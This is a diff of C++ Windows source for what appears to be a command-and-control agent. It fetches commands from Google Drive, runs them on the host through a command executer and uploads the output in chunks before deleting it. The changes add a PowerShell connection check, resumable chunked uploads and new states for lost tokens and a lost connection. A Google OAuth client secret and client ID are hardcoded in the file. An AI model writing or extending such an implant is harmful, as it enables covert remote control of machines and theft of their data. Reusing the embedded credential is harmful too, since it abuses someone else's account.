@@ -1,4 +1,3 @@
-#include "MyString.h"
 #include <windows.h>
 #include <string>
 #include <stdio.h>
@@ -22,18 +21,14 @@
 #define BDRIVE_INVALID_ACCESS_TOKEN 401
 #define BDRIVE_INVALID_REFRESH_TOKEN 699
 
-//#define STATE_OK 0b0
-//#define STATE_ACCESS_TOKEN_INVALID 0b1
-//#define STATE_REFRESH_TOKEN_INVALID 0b11 //it is obvious that if the refresh token is invalid the access token was invalid prior to it!
-//#define STATE_CONNECTION_LOST 0b10
-
+#define STATE_INIT 0b11111111
 #define STATE_DOWNLOADING 0b00
 #define STATE_EXECUTING 0b01
 #define STATE_UPLOADING 0b10
-#define STATE_SUBUPLOADING 0b11
-#define STATE_DELETING 0b100
-#define STATE_ACCESS_TOKEN_LOST 0b1000
-#define STATE_REFRESH_TOKEN_LOST 0b1001       
+#define STATE_DELETING 0b11
+#define STATE_ACCESS_TOKEN_LOST 0b100
+#define STATE_REFRESH_TOKEN_LOST 0b101
+#define STATE_CONNECTION_LOST 0b1000
 
 #define CLIENT_SECRET "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"
 #define CLIENT_ID "1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com"
@@ -103,6 +98,8 @@ inline void decoder(char str[]) {
 /// <returns>
 /// 200 OK!
 /// BDRIVE_INVALID_REFRESH_TOKEN
+/// BDRIVE_TIMED_OUT
+/// BDRIVE_NO_INTERNET
 /// </returns>
 static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken) {
 #define BUFFER_SIZE 1024
@@ -177,6 +174,29 @@ static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& 
 			return BDRIVE_INVALID_REFRESH_TOKEN;
 		}
 	}
+#undef BUFFER_SIZE
+}
+
+static WORD checkConnection()
+{
+#define BUFFER_SIZE 512
+
+	WORD errorCode = BDRIVE_NO_INTERNET;
+	char* buffer = new char[BUFFER_SIZE];
+
+	snprintf(buffer, BUFFER_SIZE - 1, "powershell.exe -c \"try { $response = Invoke-WebRequest 'http://www.google.com' -TimeoutSec 30 -Method 'HEAD'; Write-Host -NoNewline $response.StatusCode } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"");
+
+	FILE* file = _popen(buffer, "r");
+	
+	fgets(buffer, 4, file);
+
+	if (buffer[0] == '2' || buffer[0] == '4' || buffer[0] == '6')
+	{
+		errorCode = getErrorCode(buffer);
+	}
+	delete[] buffer;
+
+	return errorCode;
 #undef BUFFER_SIZE
 }
 //review this two function
@@ -295,8 +315,8 @@ static WORD commandExecuter(std::string input, std::string& output) {
 /// 600 Timeout!
 /// 601 Unhandled Exception!
 /// </returns>
-static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DWORD index, DWORD subIndex) {
-#define BUFFER_SIZE 6144 
+static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DWORD index, DWORD& subIndex) {
+#define BUFFER_SIZE 7168 
 
 	char* buffer = new char[BUFFER_SIZE];
 	WORD errorCode = BDRIVE_OK;
@@ -324,18 +344,21 @@ static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DW
 /// <param name="accessToken"></param>
 /// <param name="index">The index of whole files that you want to upload</param>
 /// <returns>Same as singlePartUpload function</returns>
-static WORD uploadResult(std::string input, std::string accessToken, WORD index, WORD subIndex = 0) {
+static WORD uploadResult(std::string input, std::string accessToken, DWORD index, DWORD& subIndex) {
 	//input = base64_encode(input);
 
 	WORD errorCode = BDRIVE_OK;
-	for (size_t i = 0, iSubIndex = subIndex; i < input.length(); iSubIndex++, i = iSubIndex * MAX_UPLOAD_SIZE)
+
+	for (size_t i = subIndex * MAX_UPLOAD_SIZE; i < input.length(); subIndex++, i = subIndex * MAX_UPLOAD_SIZE)
 	{
-		errorCode = singlePartUpload(input.substr(i, MAX_UPLOAD_SIZE), accessToken, index, iSubIndex);
+		errorCode = singlePartUpload(input.substr(i, MAX_UPLOAD_SIZE), accessToken, index, subIndex);
+
 		if (errorCode != BDRIVE_OK)
 		{
-			iSubIndex--;
+			return errorCode;
 		}
 	}
+
 	return errorCode;
 }
 
@@ -382,9 +405,13 @@ static void setNextState(BYTE& curState, WORD resCode) {
 		case BDRIVE_NO_CONTENT:
 			curState = STATE_DOWNLOADING;
 			break;
+		case BDRIVE_INVALID_ACCESS_TOKEN:
+			curState = STATE_ACCESS_TOKEN_LOST;
+			break;
 		case BDRIVE_TIMED_OUT: //TODO
 		case BDRIVE_NO_INTERNET:
 		default:
+			curState = STATE_CONNECTION_LOST;
 			break;
 		}
 	}
@@ -410,16 +437,8 @@ static void setNextState(BYTE& curState, WORD resCode) {
 			break;
 		}
 	}
-	else if (curState == STATE_SUBUPLOADING) {
-
-	}
-	else if (curState == STATE_DELETING){
+	else if (curState == STATE_DELETING) {
 		//This is the case for loosing access token
-	}
-	else if (curState == STATE_ACCESS_TOKEN_LOST)
-	{
-		// This is the case for loosing refresh token
-
 	}
 	else if (curState == STATE_REFRESH_TOKEN_LOST) {
 
